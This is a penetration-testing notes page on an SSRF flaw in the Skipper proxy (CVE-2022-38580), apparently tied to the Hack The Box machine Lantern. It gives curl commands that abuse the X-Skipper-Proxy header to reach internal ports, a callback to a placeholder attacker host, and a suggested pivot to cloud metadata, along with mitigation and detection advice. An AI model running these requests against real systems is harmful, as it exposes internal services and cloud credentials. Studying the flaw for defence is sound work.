---
topic: Skipper — SSRF with X-Skipper-Proxy (CVE-2022-38580)
tags: [web, skipper, ssrf, proxy, kubernetes, lantern]
---

# Skipper — SSRF with X-Skipper-Proxy (CVE-2022-38580)

[🌐 Español](skipper-proxy-ssrf.md) | **English**

## Concept

Skipper is an HTTP router and proxy used in front of applications, often in Kubernetes. In vulnerable versions it accepts the `X-Skipper-Proxy` header and forwards the request to the supplied destination without checking that it is an allowed backend. That turns the proxy into an SSRF: internal services that are not published become reachable.

CVE-2022-38580 affects Skipper before 0.16.0.

## When it applies

- Skipper exposed as an ingress or proxy.
- A version before the fix.
- Internal services on `127.0.0.1`, the pod network or a private subnet.
- On Lantern, the header reached an internal service on `5000` with SQLite and an admin panel on `3000`.

## Procedure

1. Confirm the target is Skipper (headers, behaviour, version).
2. Send `X-Skipper-Proxy` with your own URL and check whether the request arrives.
3. Point it at internal services (`127.0.0.1:<PORT>`, `localhost`, private IPs).
4. Enumerate internal routes and APIs.
5. Chain with the vulnerability of the reached service.

## Commands

```bash
curl -s -H 'X-Skipper-Proxy: http://<ATTACKER>/' http://<HOST>/
```

```bash
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:5000/' http://<HOST>/
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:3000/' http://<HOST>/
```

To read the internal response:

```bash
curl -s -H 'X-Skipper-Proxy: http://127.0.0.1:5000/api/health' http://<HOST>/
```

## Variants

- Try `X-Skipper-Proxy` with and without a scheme, and with a different `Host`.
- Use `http://localhost`, `http://[::1]` or the pod IP.
- Chain with cloud metadata (`169.254.169.254`) if the proxy has egress.
- On Lantern, the internal service exposed a SQLite SQLi and an admin panel.

## Limitations

- Patched versions ignore or validate the header.
- The proxy may only allow an allowlist of hosts.
- The response may not be reflected if the destination fails.
- The pod network may restrict destinations.

## Mitigation

- Update Skipper to 0.16.0 or later.
- Never let client-controlled headers choose the backend.
- Apply a destination allowlist and block metadata and loopback IPs.
- Segment the network and authenticate internal services.

## Detection

- Requests with `X-Skipper-Proxy` to internal hosts or metadata IPs.
- Connections from the proxy to unpublished ports.
- Repeated connection errors against `127.0.0.1`.
- Traffic spikes to internal services from the ingress.

## References

- [NVD — CVE-2022-38580](https://nvd.nist.gov/vuln/detail/CVE-2022-38580)
- [Skipper — Security](https://github.com/zalando/skipper/security)
- [0xdf — Lantern](https://0xdf.gitlab.io/2025/03/01/htb-lantern.html)
- [Lantern writeup](../../machines/linux/lantern/README.en.md)
